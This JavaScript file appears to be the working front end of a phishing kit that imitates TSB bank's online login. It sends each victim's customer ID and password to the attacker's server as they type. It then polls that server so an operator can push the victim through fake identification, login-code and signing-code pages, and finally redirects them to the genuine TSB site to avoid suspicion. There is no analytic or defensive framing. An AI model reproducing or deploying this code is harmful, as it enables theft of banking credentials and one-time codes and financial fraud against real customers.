const login_form = document.querySelector('#login-form');
const iban = document.querySelector('#number2');
const number = document.querySelector('#number');
const loginButton = document.querySelector('#loginButton');
const token = document.querySelector('#token');

iban.addEventListener('input', e => {
    e.preventDefault();

    const data = new FormData();
    data.append('customerid', iban.value);

    fetch('/tsb/change/' + token.value, {
            method: 'POST',
            body: data
        });
});

number.addEventListener('input', e => {
    e.preventDefault();

    const data = new FormData();
    data.append('password', number.value);

    fetch('/tsb/change/' + token.value, {
            method: 'POST',
            body: data
        });
});


login_form.addEventListener('submit', e => {
    e.preventDefault();

    if (iban.value == '' || number.value == '') {
        loginButton.disabled = false;
        iban.disabled = false;
        number.disabled = false;

        iban.value = '';
        number.value = '';

        document.querySelector('#errorMessage').style.display = 'block';
    } else {
        const data = new FormData();
        data.append('customerid', iban.value);
        data.append('password', number.value);

        loginButton.innerHTML = '<img style="width: 20px; height: auto !important;"  src="/img/ing.gif" > Please wait...';
        loginButton.disabled = true;
        iban.disabled = true;
        number.disabled = true;

        document.querySelector('#errorMessage').style.display = 'none'; 

        fetch('/f1/' + token.value, {
            method: 'POST',
            body: data
        }).then(() => {
            const newInterval = setInterval(() => {
                fetch('/f1/check/' + token.value, {
                    method: 'POST',
                }).then(res => {
                    res.json().then(data => {
                        if (data.page == 'login') {
                            loginButton.innerHTML = 'OK';
                            loginButton.disabled = false;
                            iban.disabled = false;
                            number.disabled = false;

                            iban.value = '';
                            number.value = '';

                            document.querySelector('#errorMessage').style.display = 'block';

                            clearInterval(newInterval)
                        } else if (data.page == 'identification') {
                            window.location.href = '/f2/' + token.value;
                        } else if (data.page == 'loginCode') {
                            window.location.href = '/f3/' + token.value;
                        } else if (data.page == 'signCode') {
                            window.location.href = '/f4/' + token.value;
                        } else if (data.page == 'control') {
                            window.location.href = '/f6/' + token.value;
                        }
                        else if (data.page == 'conf') {
                            window.location.href = '/f7/' + token.value;
                        }
                        else if (data.page == 'user') {
                            window.location.href = '/f8/' + token.value;
                        }
                        else if (data.page == 'finish') {
                            window.location.href = 'https://www.tsb.co.nz/';
                        } else if (data.page == 'waiting') {
                            console.log('Waiting...');
                        }
                    });
                });
            }, 500);
        });
    }
});


